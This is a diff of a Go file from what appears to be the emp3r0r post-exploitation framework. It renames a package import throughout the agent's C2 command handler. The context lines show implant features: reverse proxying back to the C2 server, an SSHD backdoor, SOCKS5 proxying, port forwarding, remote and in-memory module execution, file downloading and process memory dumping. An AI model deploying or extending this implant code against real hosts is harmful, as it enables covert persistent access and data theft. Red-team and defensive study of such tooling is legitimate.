@@ -11,7 +11,7 @@ import (
 	"strings"
 	"time"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/listener"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -27,7 +27,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 
 	switch cmdSlice[0] {
 
-	case emp3r0r_data.C2CmdListDir:
+	case emp3r0r_def.C2CmdListDir:
 		// List directory and return entries
 		// Usage: !ls --path <path>
 		path := flags.StringP("path", "p", "", "Path to list")
@@ -49,7 +49,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 	// stat file
 	// Usage: !stat --path <path>
 	// Retrieves file statistics for the specified path.
-	case emp3r0r_data.C2CmdStat:
+	case emp3r0r_def.C2CmdStat:
 		path := flags.StringP("path", "p", "", "Path to stat")
 		flags.Parse(cmdSlice[1:])
 		if *path == "" {
@@ -78,7 +78,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 	// Usage: !bring2cc --addr <target_agent_ip>
 	// Sets up a reverse proxy to the specified agent IP address.
 	// This will forward our SOCKS5 proxy to the target agent's identical port.
-	case emp3r0r_data.C2CmdBring2CC:
+	case emp3r0r_def.C2CmdBring2CC:
 		addr := flags.StringP("addr", "a", "", "Target agent IP address")
 		kcp := flags.StringP("kcp", "k", "off", "Use KCP for reverse proxy")
 		flags.Parse(cmdSlice[1:])
@@ -90,8 +90,8 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 
 		out = fmt.Sprintf("Bring2CC: Reverse proxy for %s finished", *addr)
 
-		hasInternet := tun.TestConnectivity(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
-		isProxyOK := tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress)
+		hasInternet := tun.TestConnectivity(emp3r0r_def.CCAddress, RuntimeConfig.C2TransportProxy)
+		isProxyOK := tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_def.CCAddress)
 		if !hasInternet && !isProxyOK {
 			out = "Error: We don't have any internet to share"
 		}
@@ -110,7 +110,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			// kcp will forward to this target address
 			targetAddrWithPort = fmt.Sprintf("127.0.0.1:%s", kcp_listen_port)
 			kcp_server_addr := fmt.Sprintf("%s:%s", *addr, RuntimeConfig.KCPServerPort)
-			go tun.KCPTunClient(kcp_server_addr, kcp_listen_port, RuntimeConfig.Password, emp3r0r_data.MagicString, ctx, cancel)
+			go tun.KCPTunClient(kcp_server_addr, kcp_listen_port, RuntimeConfig.Password, emp3r0r_def.MagicString, ctx, cancel)
 			util.TakeABlink() // wait for KCP to start
 		}
 		proxyPort, a2iErr := strconv.Atoi(RuntimeConfig.Emp3r0rProxyServerPort)
@@ -122,7 +122,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		if err = tun.SSHReverseProxyClient(targetAddrWithPort, RuntimeConfig.Password,
 			proxyPort,
 			&ReverseConns,
-			emp3r0r_data.ProxyServer,
+			emp3r0r_def.ProxyServer,
 			ctx, cancel); err != nil {
 			out = err.Error()
 		}
@@ -130,7 +130,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 
 	// Usage: !sshd --shell <shell> --port <port> --args <args>
 	// Starts an SSHD server with the specified shell, port, and arguments.
-	case emp3r0r_data.C2CmdSSHD:
+	case emp3r0r_def.C2CmdSSHD:
 		shell := flags.StringP("shell", "s", "", "Shell to use")
 		port := flags.StringP("port", "p", "", "Port to use")
 		args := flags.StringSliceP("args", "a", []string{}, "Arguments for SSHD")
@@ -168,7 +168,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 	// !proxy --mode on --addr 0.0.0.0:12345
 	// Usage: !proxy --mode <mode> --addr <address>
 	// Starts a Socks5 proxy server with the specified mode and address.
-	case emp3r0r_data.C2CmdProxy:
+	case emp3r0r_def.C2CmdProxy:
 		mode := flags.StringP("mode", "m", "", "Proxy mode")
 		addr := flags.StringP("addr", "a", "", "Address to bind")
 		flags.Parse(cmdSlice[1:])
@@ -191,7 +191,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 	// !port_fwd --to/listen [to/listen] --shID [shID] --operation/protocol [operation/protocol] --timeout [timeout]
 	// Usage: !port_fwd --to <target> --shID <session_id> --operation <operation> --timeout <timeout>
 	// Sets up port forwarding with the specified parameters.
-	case emp3r0r_data.C2CmdPortFwd:
+	case emp3r0r_def.C2CmdPortFwd:
 		to := flags.StringP("to", "t", "", "Target address")
 		sessionID := flags.StringP("shID", "s", "", "Session ID")
 		operation := flags.StringP("operation", "o", "", "Operation type")
@@ -237,7 +237,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 	// !delete_portfwd --id id
 	// Usage: !delete_portfwd --id <session_id>
 	// Deletes the specified port forwarding session.
-	case emp3r0r_data.C2CmdDeletePortFwd:
+	case emp3r0r_def.C2CmdDeletePortFwd:
 		id := flags.StringP("id", "i", "", "Session ID")
 		flags.Parse(cmdSlice[1:])
 		if *id == "" {
@@ -253,7 +253,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 	// !utils
 	// Usage: !utils --checksum <checksum> --download_addr <download_address>
 	// Executes utility functions on the agent.
-	case emp3r0r_data.C2CmdUtils:
+	case emp3r0r_def.C2CmdUtils:
 		checksum := flags.StringP("checksum", "c", "", "Checksum")
 		download_addr := flags.StringP("download_addr", "d", "", "Download address from other agents")
 		flags.Parse(cmdSlice[1:])
@@ -270,7 +270,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 	// !custom_module --mod_name mod_name --checksum checksum
 	// Usage: !custom_module --mod_name <module_name> --exec <executable file> --env "VAR1=1,VAR2=2" --checksum <checksum> --in_mem <in_memory>
 	// Loads a custom module with the specified name and checksum.
-	case emp3r0r_data.C2CmdCustomModule:
+	case emp3r0r_def.C2CmdCustomModule:
 		modName := flags.StringP("mod_name", "m", "", "Module name")
 		exec_cmd := flags.StringP("exec", "x", "", "Run this command to start the module")
 		checksum := flags.StringP("checksum", "c", "", "Checksum")
@@ -291,7 +291,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 	// !upgrade_agent --checksum checksum
 	// Usage: !upgrade_agent --checksum <checksum>
 	// Upgrades the agent with the specified checksum.
-	case emp3r0r_data.C2CmdUpdateAgent:
+	case emp3r0r_def.C2CmdUpdateAgent:
 		checksum := flags.StringP("checksum", "c", "", "Checksum")
 		flags.Parse(cmdSlice[1:])
 		if *checksum == "" {
@@ -302,7 +302,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !listener --listener listener --port port --payload payload --compression on/off --passphrase passphrase
-	case emp3r0r_data.C2CmdListener:
+	case emp3r0r_def.C2CmdListener:
 		listener_type := flags.StringP("listener", "l", "http_aes_compressed", "Listener")
 		port := flags.StringP("port", "p", "8000", "Port")
 		payload := flags.StringP("payload", "P", "", "Payload")
@@ -342,7 +342,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 	// !file_server --port port
 	// this will start a TCP file server with AES_GCM, clients can request arbitrary files at specified offset
 	// when this server runs, it will cache files from C2, so that we can serve files to agents
-	case emp3r0r_data.C2CmdFileServer:
+	case emp3r0r_def.C2CmdFileServer:
 		port := flags.StringP("port", "p", "8000", "Port")
 		server_switch := flags.StringP("switch", "s", "on", "Switch")
 		flags.Parse(cmdSlice[1:])
@@ -365,7 +365,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			out = fmt.Sprintf("File server on port %s is now %s", *port, *server_switch)
 		}
 
-	case emp3r0r_data.C2CmdFileDownloader:
+	case emp3r0r_def.C2CmdFileDownloader:
 		// !file_downloader --url <url> --path <path> --checksum <checksum>
 		url := flags.StringP("download_addr", "u", "", "URL to download")
 		path := flags.StringP("path", "p", "", "Path to save")
@@ -383,7 +383,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			out = fmt.Sprintf("File downloaded to %s", *path)
 		}
 
-	case emp3r0r_data.C2CmdMemDump:
+	case emp3r0r_def.C2CmdMemDump:
 		// !mem_dump --pid <pid> --path <path>
 		pid := flags.IntP("pid", "p", 0, "PID of target process")
 		flags.Parse(cmdSlice[1:])
